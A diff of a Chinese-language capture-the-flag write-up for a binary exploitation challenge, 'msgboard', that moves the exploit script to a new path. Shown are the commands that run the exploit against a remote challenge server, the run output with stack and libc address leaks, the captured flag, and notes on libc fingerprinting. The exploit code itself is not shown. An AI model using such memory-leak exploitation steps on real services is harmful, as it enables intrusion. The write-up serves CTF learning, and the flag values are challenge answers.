@@ -226,14 +226,14 @@ flag{...}
 
 ## 6. 完整利用脚本
 
-保存于 `exploits/msgboard.py`，命令：
+保存于 `exploits/pwn/msgboard.py`，命令：
 
 ```bash
 # 远端（端口会轮换，可显式指定 host/port）
-.venv/bin/python exploits/msgboard.py remote
-.venv/bin/python exploits/msgboard.py remote 49.232.142.230 11561
+.venv/bin/python exploits/pwn/msgboard.py remote
+.venv/bin/python exploits/pwn/msgboard.py remote 49.232.142.230 11561
 # 本地（Linux）
-.venv/bin/python exploits/msgboard.py
+.venv/bin/python exploits/pwn/msgboard.py
 ```
 
 ```python
@@ -315,7 +315,7 @@ if __name__ == '__main__':
 ## 7. 运行输出
 
 ```
-$ .venv/bin/python exploits/msgboard.py remote
+$ .venv/bin/python exploits/pwn/msgboard.py remote
 [x] Opening connection to 49.232.142.230 on port 11561
 [*] stack msgbuf @ 0x7fff94596ca0
 [+] puts leak = 0x7fcc9e9a2420  libc base = 0x7fcc9e91e000
@@ -346,7 +346,7 @@ Flag：`flag{81b05037e85cf206f63ebd941bff1079}`
 ## 9. 验证
 
 - Flag 两次独立连接均为 `flag{81b05037e85cf206f63ebd941bff1079}`，格式为 `flag{32位hex}`。
-- 本地 Lima Ubuntu 22.04 复现：自建 `/flag` 后 `exploits/msgboard.py`（本地 libc）输出
+- 本地 Lima Ubuntu 22.04 复现：自建 `/flag` 后 `exploits/pwn/msgboard.py`（本地 libc）输出
   `DASCTF{local_test_flag_123}`，验证利用链与 libc 偏移无关（只换 libc 常量）。
 - 远端 libc 用 `puts`/`read` 两个泄漏地址在 libc.rip 指纹匹配，唯一命中
   `libc6_2.31-0ubuntu9.10_amd64`；`base + read_off` 与实测 `read` 泄漏完全一致。
